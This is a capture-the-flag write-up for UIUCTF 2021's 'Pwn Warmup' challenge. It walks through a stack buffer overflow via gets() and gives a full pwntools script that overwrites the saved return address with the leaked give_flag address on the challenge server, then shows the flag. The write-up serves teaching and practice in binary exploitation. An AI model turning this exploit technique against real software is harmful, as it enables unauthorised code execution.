# Pwn Warmup - 50 pts, 214 solves
> Hmm this time we arent just going to give you the flag like last year... What can you do?!
> 
> nc pwn-warmup.chal.uiuc.tf 1337
> 
> challenge

`Pwn Warmup` was a pwn (binary exploitation) challenge in UIUCTF 2021, where I played with `TeamlessCTF`, placing 12th place overall. Although my team solved this challenge before I got a chance to during the CTF, I wanted to make a writeup for it anyways.

We first decompile the `main` function in Ghidra:

```C
void main(void)

{
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  puts("This is SIGPwny stack3, go");
  printf("&give_flag = %p\n",give_flag);
  vulnerable();
  return;
}
```

It seems that the challenge first calls `setvbuf` to help input/output to work in the remote connection, and then prints out the address of the `give_flag` function. Then, the program calls the `vulnerable` function, which (of course) is vulnerable. Let's look at the decompilation:

```C
void vulnerable(void)

{
  char buf [8];
  
  gets(buf);
  return;
}
```

Hmmm... The program calls `gets()` on the `buf` variable. Let's read from the man page of `gets`:

```
DESCRIPTION
       Never use this function.

       gets()  reads  a  line  from  stdin into the buffer pointed to by s until either a terminating newline or EOF,
       which it replaces with a null byte ('\0').  No check for buffer overrun is performed (see BUGS below).
```

In case you didn't notice:

> Never use this function.

OK. So the program is using an insecure function. Why is `gets()` insecure? According to the man page, `gets` reads input from `stdin` until a newline, and then *writes it to memory*. No check for how much memory is being written to, so we can overwrite whatever we want in memory. Let's visualize the memory:

```
|        buf[8]        |                       | saved ebp | saved eip |
------------------------------------------------------------------------
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
```

`buf` is the area we write to, and the saved ebp and eip are the places where the program has saved registers for when the program returns to the function from which it was called. If we overwrite it with an address, we can control where the program jumps to after the `vulnerable()` function is done. Luckily for us, the program has provided us with a `give_flag` function that prints out the flag. So our goal is to overwrite the saved eip with the address of give_flag.

How do we do this? Let's examine memory again.

Let's say we input `AAAAAAAA` into the program. Then the program writes the input to `buf`:

```
|        buf[8]        |                       | saved ebp | saved eip |
------------------------------------------------------------------------
41 41 41 41 41 41 41 41 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
```

The program functions as normal, because we did not give more input that it could take. But what if we inputted more text?

Let's say we inputted `AAAAAAAAAAAAAAAAAAAA` (24 `A`s) into the program. Now our memory looks like this:

```
|        buf[8]        |                       | saved ebp | saved eip |
------------------------------------------------------------------------
41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
```

Our saved eip is now `0x41414141` (note that 0x41 is the hex value of `A` so our `A`s are getting written to the saved eip). This will cause a segmentation fault because the program is trying to jump to the address `0x41414141` but doesn't work because there isn't actually any memory at `0x41414141`. Progress! We crashed the program.

So what if we changed our `0x41414141` with something a little more controlled... Let's say the address of `give_flag`. Luckily, our program prints out the address of `give_flag` when we run it. So, all we need to do is:

- send 20 `A`s to get through `buf` and ebp
- send the address of `give_flag` to overflow eip

Hold on. We can't literally send the numbers that represent the address of `give_flag`, we need to send them in the format that the program expects addresses. We need to send the address as hex, and in *little endian*. This means that we translate our address from hex to ASCII and send it in backwards.

Now, this all seems kind of complicated. But don't fear! We have a trusty python package to do this for us, including formatting the address in little endian and sending those unprintable characters to the server!

We will use the `pwntools` python package, which has all sorts of tools for pwn challenges. We can start a pwntools script:

```python
#!/usr/bin/env python3

from pwn import * # import pwntools

conn = remote("pwn-warmup.chal.uiuc.tf", 1337) # connect to the remote server
``` 

OK! We have a script that will connect to the remote server. Now, we use our program to programatically get the address of `give_flag` that was printed out:

```python
conn.recvuntil("&give_flag = ")
give_flag = int(conn.recvline(), 0)
```

We recieve the input up to `&give_flag = `, then we recieve the rest of the line, which is simply the address in hex. We convert this to an `int`.

Now, it's time to build our payload. We first need 20 `A`s and then the address of `give_flag`. Remember the little endian stuff? Pwntools has a function, `p32`, that will format an address to little endian for 32-bit programs such as this one. (it uses `struct.pack` behind the scenes if you want to figure out what it's doing)

```python
payload = b"A" * 20 # 20 As
payload += p32(give_flag) # format our address in little endian
```

So now we have a payload that will overwrite the saved eip (the return address) with the address of `give_flag`. We send it with pwntools:

```python
conn.sendline(payload) # send the payload to the server
conn.stream() # print the output
```

And with that, we get the flag printed out for us.

Flag: `uiuctf{k3b0ard_sp@m_do3snT_w0rk_anYm0r3}`

Full solve script:

```python
#!/usr/bin/env python3

from pwn import *

conn = remote("pwn-warmup.chal.uiuc.tf", 1337)

conn.recvuntil("&give_flag = ")
give_flag = int(conn.recvline(), 0)

payload = b"A"*20
payload += p32(give_flag)

conn.sendline(payload)

conn.stream()
```
